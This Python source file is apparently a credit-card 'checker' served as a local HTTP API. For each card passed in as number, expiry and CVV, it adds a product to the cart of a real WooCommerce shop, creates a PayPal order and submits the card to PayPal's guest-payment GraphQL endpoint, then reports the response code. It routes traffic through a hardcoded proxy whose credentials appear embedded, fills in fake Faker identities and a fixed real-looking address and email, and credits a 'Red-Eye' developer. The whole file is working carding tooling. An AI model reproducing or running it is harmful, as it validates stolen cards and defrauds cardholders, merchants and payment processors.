from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import urllib.parse
from faker import Faker
fake = Faker()
import itertools
import requests
import time
r = requests.Session()
proxies = ["ultra.marsproxies.com:44443:mr35206u0Jf:MmXjWQiug2_country-us"]
def find_between(data, first, last):
    try:
        start = data.index(first) + len(first)

        end = data.index(last, start)

        return data[start:end]

    except ValueError:
        return

def paypal(cc,mes,ano,cvv):
    email = fake.email()
    email = email.split("@")[0]
    email = email + "@gmail.com"
    name = fake.name()
    first = name.split(" ")[0]
    fist = name.split(" ")[1]
    r.cookies.clear()
    r.headers.clear()
    r.proxies.clear()
    proxy_cycle = itertools.cycle(proxies)
    proxy_str = next(proxy_cycle)
    p = {
        "http": f"http://{proxy_str}",
        "http": f"http://{proxy_str}"
    }
    start = time.time()
    headers = {
     'authority': 'iaddcart.com',
     'accept': '*/*',
     'accept-language': 'en-US,en;q=0.9',
     'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
     'origin': 'https://iaddcart.com',
     'referer': 'https://iaddcart.com/product/1pc-reusable-beer-water-dispenser-lid-plastic-protector-caps-cover-bottle-top-soda-saver-can-cap-useful-creative-accessories/?attribute_pa_color=1pcs-random-color',
     'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
     'sec-ch-ua-mobile': '?0',
     'sec-ch-ua-platform': '"Windows"',
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'same-origin',
     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
     'x-requested-with': 'XMLHttpRequest',
    }

    data = {
     'action': 'kapee_ajax_add_to_cart',
     'add-to-cart': '4920',
     'attribute_pa_color': '1pcs-random-color',
     'quantity': '1',
     'product_id': '4920',
     'variation_id': '4921',
    }

    response = r.post('https://iaddcart.com/wp-admin/admin-ajax.php', headers=headers, data=data,proxies=p)
    rs2 = r.get('https://iaddcart.com/checkout/', headers=headers,proxies=p)
    rs2_text = rs2.text
    non = find_between(rs2_text, 'id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="', '"',)
    non2 = find_between(rs2_text, '?wc-ajax=ppc-create-order","nonce":"', '"',)

    headers3 = {
     'authority': 'iaddcart.com',
     'accept': '*/*',
     'accept-language': 'en-US,en;q=0.9',
     'content-type': 'application/json',
     'origin': 'https://iaddcart.com',
     'referer': 'https://iaddcart.com/checkout/',
     'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
     'sec-ch-ua-mobile': '?0',
     'sec-ch-ua-platform': '"Windows"',
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'same-origin',
     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    }


    json_data = {
     'nonce': non2,
     'payer': None,
     'bn_code': 'Woo_PPCP',
     'context': 'checkout',
     'order_id': '0',
     'payment_method': 'ppcp-gateway',
     'funding_source': 'card',
     'form_encoded': 'billing_first_name=techno&billing_last_name=tinker&billing_company=&billing_country=US&billing_address_1=3448+Ile+De+France+St+%23242&billing_address_2=&billing_state=AK&billing_city=Fort+Wainwright&billing_postcode=99611&billing_phone=7488810567&billing_email=technotinker2020%40gmail.com&billing_rut=&billing_cpf=&billing_t_id=&shipping_first_name=techno&shipping_last_name=tinker&shipping_company=&shipping_country=US&shipping_address_1=3448+Ile+De+France+St+%23242&shipping_address_2=&shipping_state=AK&shipping_city=Fort+Wainwright&shipping_postcode=99611&shipping_phone=7488810567&shipping_rut=&shipping_cpf=&shipping_t_id=&order_comments=&shipping_method%5B0%5D=free_shipping%3A1&payment_method=ppcp-gateway&woocommerce-process-checkout-nonce={non}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card',
     'createaccount': False,
     'save_payment_method': False,
    }

    rs3 = r.post('https://iaddcart.com/?wc-ajax=ppc-create-order', headers=headers3, json=json_data,proxies=p)
    rs3_text = rs3.text
    orderid = find_between(rs3_text, '"id":"', '","',)

    headers4 = {
     'authority': 'www.paypal.com',
     'accept': '*/*',
     'accept-language': 'en-US,en;q=0.9',
     'content-type': 'application/json',
     'origin': 'https://www.paypal.com',
     'paypal-client-context': "{orderid}",
     'paypal-client-metadata-id': "{orderid}",
     'referer': 'https://www.paypal.com/smart/card-fields?sessionID=uid_95bc507f5d_mtu6ntu6mzq&buttonSessionID=uid_3d53a1a232_mty6mde6mte&locale.x=en_US&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVhDTG1fTkRad1dTbENUNzZjSkpmSTB4Z29mRmJsc192TXpxMkVSNnU2WndHYktaXzc2Y2pOU2FkMHlLclJNRTdrOE5fU19lLUVfcC10NjkmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyNC0wMy0xMiZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSxtZXNzYWdlcyZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfZnRmdHdjZGxubnpydWtjdWNvZm5mamVneGJxa256In19&disable-card=&token=1KE0784473579371R',
     'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
     'sec-ch-ua-mobile': '?0',
     'sec-ch-ua-platform': '"Windows"',
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'same-origin',
     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
     'x-app-name': 'standardcardfields',
     'x-country': 'US',
    }

    json_data = {
        'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
        'variables': {
            'token': orderid,
            'card': {
                'cardNumber': cc,
                'expirationDate': f"{mes}/{ano}",
                'postalCode': '10080',
                'securityCode': cvv,
            },
            'firstName': first,
            'lastName': fist,
            'billingAddress': {
                'givenName': first,
                'familyName': fist,
                'line1': '3448 Ile De France St #242',
                'line2': None,
                'city': 'New York',
                'state': 'NY',
                'postalCode': '10080',
                'country': 'US',   
            },
            'email': email,
            'currencyConversionType': 'PAYPAL', 

        },  
        'operationName': None,
    }                  


    try:
     response = r.post(
     'https://www.paypal.com/graphql?fetch_credit_form_submit',
     headers=headers4,
     json=json_data,
     proxies=p,
    )
     end = time.time()
     global current
     current = end - start
     data = response.text
     data = json.loads(str(data))
     result = data.get("errors", [{}])[0].get("data", [{}])[0].get("code")
     return result
    except Exception as e:
        return "ERROR"
        print(e)
        pass


class APIHandler(BaseHTTPRequestHandler):
    def _set_headers(self, status_code=200):
        self.send_response(status_code)
        self.send_header('Content-type', 'application/json')
        self.end_headers()

    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        cardx = urllib.parse.parse_qs(parsed_path.query).get('card', [''])[0]
        cc,mes,ano,cvv = cardx.split("|")
        print(cc,mes,ano,cvv)
        result = paypal(cc,mes,ano,cvv)
        self._set_headers()
        response_data = [
          {"$Result": result},
          {"$Time_Taken": current},
          {"$Developer": "@l1xky"},
          {"$Team": "Red-Eye"}
        ]


        for obj in response_data:
          self.wfile.write(json.dumps(obj).encode('utf-8') + b'\n' + b'\n' + b'\n' + b'\n' + b'\n' + b'\n' + b'\n' + b'\n' + b'\n' + b'\n' + b'\n' + b'\n' + b'\n' + b'\n' + b'\n' + b'\n' + b'\n' + b'\n' + b'\n' + b'\n' + b'\n' + b'\n' + b'\n' + b'\n' + b'\n' + b'\n' + b'\n')


def run(server_class=HTTPServer, handler_class=APIHandler, port=8000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting server on port {port}...')
    httpd.serve_forever()

if __name__ == '__main__':
    run()
